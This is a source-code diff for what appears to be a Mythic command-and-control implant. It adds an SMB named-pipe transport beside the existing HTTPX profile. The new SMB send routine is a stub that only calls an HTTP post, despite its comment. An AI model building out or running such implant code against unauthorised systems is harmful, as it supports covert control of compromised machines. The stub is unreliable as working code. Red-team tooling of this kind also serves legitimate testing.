@@ -2,7 +2,8 @@
 
 #include "Network.h"
 #include "Config.h"
-#include "Http.h"
+#include "TransportHttp.h"
+#include "TransportSmb.h"
 #include "Parser.h"
 #include "Package.h"
 #include "Strategy.h"
@@ -41,7 +42,7 @@ VOID NetworkInitMutex()
  */
 BOOL NetworkRequest(_In_ PPackage package, _Out_ PBYTE* ppOutData, _Out_ SIZE_T* pOutLen)
 {
-// HTTPX C2 Profile (only currently supported c2 profile)
+/* HTTPX C2 Profile */
     #ifdef HTTPX_TRANSPORT
         BOOL bStatus = FALSE; 
         
@@ -54,7 +55,16 @@ BOOL NetworkRequest(_In_ PPackage package, _Out_ PBYTE* ppOutData, _Out_ SIZE_T*
         return TRUE;
     #endif
 
-    #ifdef HTTP_TRANSPORT
+/* SMB C2 Profile */
+    #ifdef SMB_TRANSPORT
+        BOOL bStatus = FALSE; 
+        
+        /* Send data to named pipe */
+        bStatus = NetworkSmbSend(package, ppOutData, pOutLen);
+        
+        if (bStatus == FALSE || ppOutData == NULL || pOutLen == NULL)
+            return FALSE;
+
         return TRUE;
     #endif
 
@@ -140,13 +150,33 @@ retry_request:
     return bStatus;
 }
 
-#endif
+#endif  // HTTPX_TRANSPORT
 
 
 
-#ifdef HTTP_TRANSPORT
-    // good code
-#endif
+#ifdef SMB_TRANSPORT
+/**
+ * @brief Transport Mythic using SMB profile.
+ * 
+ * @param[in] package Payload to send to Mythic server.
+ * @param[out] ppOutData Output buffer from response.
+ * @param[out] pOutLen Length of response output.
+ * 
+ * @return BOOL
+ */
+BOOL NetworkSmbSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
+{
+    BOOL bStatus = FALSE;
+
+    /* Create named pipe server if does not exist */
+    
+    
+    bStatus = HttpPost(package, ppOutData, pOutLen);
+
+    return bStatus;
+}
+
+#endif  // SMB_TRANSPORT
 
 
 #ifdef DNS_TRANSPORT
